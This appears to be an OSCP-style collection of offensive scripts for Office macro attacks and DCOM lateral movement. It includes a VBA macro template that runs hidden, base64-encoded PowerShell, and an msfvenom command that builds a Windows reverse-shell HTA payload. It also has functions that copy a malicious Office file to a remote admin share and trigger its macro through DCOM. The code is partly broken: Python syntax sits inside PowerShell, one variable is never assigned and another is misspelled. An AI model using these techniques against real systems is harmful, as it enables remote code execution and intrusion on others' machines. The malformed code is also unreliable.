# OSCP code extending functionality 


#Sub MyMacro()
#    Dim Str As String
#    
#    Str = Str + "powershell.exe -nop -w hidden -e string..."
#    Str = Str + "string... string"
#    ...
#    Str = Str + "base64 encoded string"
#    Str = Str + "last line of the base64 encoded string"
#    Shell (Str)
#End Sub


# Provide a MSFVenom .hta as a string
# msfvenom -p windows/shell_reverse_tcp LHOST=$DC-IP LPORT=4444 -f hta-psh -o evil.hta
function Format-Macro-B64-String-Bypass ($base64EncodeString) {
str = "powershell.exe -nop -w hidden -e " + $base64EncodedString
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
}


# Create an instance, listing all avaliable methods
function Recon-Application-Dcom-Methods ($applicationName, $IP) {
	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("$applicationName.Application", "$IP"))
	Invoke-Command {$com | Get-Member} | Write-Output


function Copy-Bad-Office-File ($Application, $IP, $LocalPathToFile, $RemoteIP, $Macroname) {
# Create instance
$com = [activator]::CreateInstance([type]::GetTypeFromProgId($Application, $IP))

$LocalPath = "C:\$LocalPathToFile"
# Trim filepath for just
$Filename = 

$RemotePath = "\\$LemoteIP\c$\$filename"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\$remoteIP\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\$filename")

$com.Run("$Macroname")
}
